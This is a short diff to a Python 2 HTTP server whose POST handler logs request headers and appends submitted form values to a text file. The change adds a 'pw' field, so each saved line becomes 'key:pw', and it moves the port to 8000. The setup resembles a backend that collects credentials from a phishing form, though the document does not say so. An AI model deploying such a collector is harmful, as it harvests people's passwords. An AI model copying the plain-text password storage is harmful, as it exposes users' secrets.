@@ -2,8 +2,9 @@ import SimpleHTTPServer
 import SocketServer
 import logging
 import cgi
+import sys
 
-PORT = 80
+PORT = 8000
 
 class ServerHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
 
@@ -14,6 +15,7 @@ class ServerHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
     def do_POST(self):
         myStri = ""
         logging.error(self.headers)
+        
         form = cgi.FieldStorage(
             fp=self.rfile,
             headers=self.headers,
@@ -22,8 +24,8 @@ class ServerHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
                      })
 
         with open("test.txt", "a") as myfile:
-             myfile.write(str(form.getvalue('key')) + "\n")
-
+             myfile.write(str(form.getvalue('key')) + ":" + str(form.getvalue('pw')) + "\n")
+        
 
         SimpleHTTPServer.SimpleHTTPRequestHandler.do_GET(self)
 
@@ -31,5 +33,5 @@ Handler = ServerHandler
 
 httpd = SocketServer.TCPServer(("", PORT), Handler)
 
-print "serving at port", PORT
+
 httpd.serve_forever()
